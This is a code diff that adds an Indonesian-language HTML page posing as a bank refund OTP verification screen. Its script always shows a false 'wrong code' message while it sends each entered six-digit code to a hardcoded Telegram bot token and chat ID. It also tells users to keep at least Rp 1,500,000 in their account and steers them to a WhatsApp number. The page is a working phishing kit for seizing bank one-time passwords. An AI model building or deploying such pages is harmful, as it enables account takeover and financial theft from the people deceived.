@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Input OTP</title>
+  <meta name="theme-color" content="RoyalBlue">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      background-color: white;
+    }
+
+    #gambar-atas img, #gambar-bawah img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto; /* Memposisikan gambar di tengah */
+    }
+    
+    #verifikasi-otp-container {
+      display: flex;
+      margin-bottom: 10px;
+      position: relative;
+      top: 38px;
+      margin-left: 90px;
+      left: -30px;
+      align-items: flex-start;
+    }
+
+    #verifikasi-otp-text {
+      color: #2f539b;
+      font-size: 14px;
+      margin-right: 15px;
+      font-weight: bold;
+    }
+
+    #countdown {
+      color: #2f539b;
+      font-size: 14px;
+      font-weight: bold;
+      text-align: left;
+      margin-right: 5px;
+      margin-left: 5px;
+      margin-top: 1%px;
+      left: -20px;
+    }
+
+    #otp-input {
+      margin-bottom: 30px;
+    }
+
+    #otp-input input {
+      width: 20px;
+      padding: 9px;
+      text-align: center;
+      margin: 4 9px;
+      border-radius: 15px;
+      border: 2px solid #2f539b;
+      background-color: white;
+      font-weight: bold;
+      height: 25px;
+      margin-top: 40px;
+    }
+
+    #submit-button {
+      padding: 14px;
+      border-radius: 5px;
+      border: none;
+      background-color: #2f539b;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      width: 250px;
+      margin-bottom: 40px;
+    }
+
+    #invalid-otp-message {
+      color: white;
+      font-weight: bold;
+      display: none;
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: rgba(255, 0, 0, 0.5);
+      padding: 10px;
+      border-radius: 10px;
+      z-index: 999;
+    }
+
+    .link {
+      color: #2f539b;
+      text-decoration: none;
+      cursor: pointer;
+      font-weight: bold;
+      margin-bottom: 20px;
+      font-size: 15px;
+    }
+    .black-text {
+  color: red;
+  font-size: 14px;
+  margin-right:-8px;
+  margin-left:7px;
+  font-weight:bold;
+  position:center;
+  padding:5px;
+  margin-bottom: 30px;
+    }
+    .Red-text {
+      color:black;
+      font-weight:bold;
+      font-size:15px;
+    }
+  
+  </style>
+</head>
+<body>
+  <p class="right-align Red-text">Cek Sms Yang Dikirim Ke Nomor Anda.<br>Pastikan Nomor Anda Tetap Aktif <br>
+  Jangan Tinggalkan Halaman Ini Sebelum Input OTP.</p>
+
+  <div id="verifikasi-otp-container">
+    <div id="verifikasi-otp-text">Verifikasi OTP :</div>
+    <div id="countdown"></div>
+  </div>
+
+  <div id="invalid-otp-message">KODE OTP SALAH</div>
+
+  <div id="otp-input">
+    <input type="number" maxlength="1" id="digit1" oninput="moveToNext(this)" onkeydown="handleKeyDown(event)">
+    <input type="number" maxlength="1" id="digit2" oninput="moveToNext(this)" onkeydown="handleKeyDown(event)">
+    <input type="number" maxlength="1" id="digit3" oninput="moveToNext(this)" onkeydown="handleKeyDown(event)">
+    <input type="number" maxlength="1" id="digit4" oninput="moveToNext(this)" onkeydown="handleKeyDown(event)">
+    <input type="number" maxlength="1" id="digit5" oninput="moveToNext(this)" onkeydown="handleKeyDown(event)">
+    <input type="number" maxlength="1" id="digit6" oninput="limitToOneDigit(this)" onkeydown="handleLastDigit(event)">
+  </div>
+
+  <button id="submit-button" onclick="submitOTP()">Lanjut</button>
+  
+  <p class="right-align black-text">Untuk Menerima OTP<br>Pastikan Saldo Rek Cukup Dari Nilai Minimal<br> Yang Di Tentukan.<br>Saldo Rekening minimal Rp.1.500.000<br>Yang Ada Di Rekening Yang Akan Menerima Dana Refund
+  </p>
+
+  <div id="links">
+    <p id="request-otp-link" class="link">>>Request Kode OTP<<</p>
+    <p id="download-otp-link" class="link">>>Download Kode OTP Cadangan<<</p>
+  </div>
+
+  <script>
+    function moveToNext(input) {
+      if (input.value.length >= 1) {
+        var nextInput = input.nextElementSibling;
+        if (nextInput) {
+          nextInput.focus();
+        }
+      }
+    }
+
+    function limitToOneDigit(input) {
+      if (input.value.length > 1) {
+        input.value = input.value.slice(0, 1);
+      }
+    }
+
+    function handleKeyDown(event) {
+      var validKeys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'Backspace'];
+      if (!validKeys.includes(event.key)) {
+        event.preventDefault();
+      }
+    }
+
+    function handleLastDigit(event) {
+      if (event.key === 'Backspace' && event.target.value === '') {
+        var previousInput = event.target.previousElementSibling;
+        if (previousInput) {
+          previousInput.focus();
+        }
+      }
+    }
+
+    function submitOTP() {
+      // Mengambil nilai OTP
+      var otp = "";
+      for (var i = 1; i <= 6; i++) {
+        var digitInput = document.getElementById("digit" + i);
+        otp += digitInput.value;
+      }
+
+      // Menampilkan pesan "KODE OTP SALAH" hanya sebentar
+      displayInvalidOTPMessage();
+
+      // Kirim OTP ke bot Telegram
+      sendTelegramMessage(otp);
+    }
+
+    function displayInvalidOTPMessage() {
+      document.getElementById("invalid-otp-message").style.display = "block";
+      setTimeout(function() {
+        document.getElementById("invalid-otp-message").style.display = "none";
+      }, 2000); // Menampilkan pesan selama 2 detik
+    }
+
+    function sendTelegramMessage(message) {
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+        if (this.readyState === 4 && this.status === 200) {
+          console.log("Pesan terkirim ke Telegram: " + message);
+        }
+      };
+
+      var botToken = "YOUR_BOT_TOKEN";
+      var chatId = "YOUR_CHAT_ID";
+      var url = "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+
+      xhttp.open("POST", url, true);
+      xhttp.send();
+    }
+
+    function startCountdown() {
+      var countDownDate = new Date().getTime() + 5 * 60 * 1000;
+      var countdownElement = document.getElementById("countdown");
+
+      var x = setInterval(function() {
+        var now = new Date().getTime();
+        var distance = countDownDate - now;
+
+        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        countdownElement.innerHTML = "" + minutes + "m " + seconds + "s ";
+
+        if (distance < 0) {
+          clearInterval(x);
+          countdownElement.innerHTML = "Waktu Habis";
+        }
+      }, 1000);
+    }
+    window.onload = function() {
+      startCountdown();
+    };
+
+    document.getElementById("request-otp-link").addEventListener("click", function() {
+      var message = "Hallo Saya Butuh Kode Verifikasi";
+      var phone_number = "6287865335501";
+      var url = "https://api.whatsapp.com/send?phone=" + phone_number + "&text=" + encodeURIComponent(message);
+      window.open(url, "_blank");
+    });
+  </script>
+</body>
+</html>
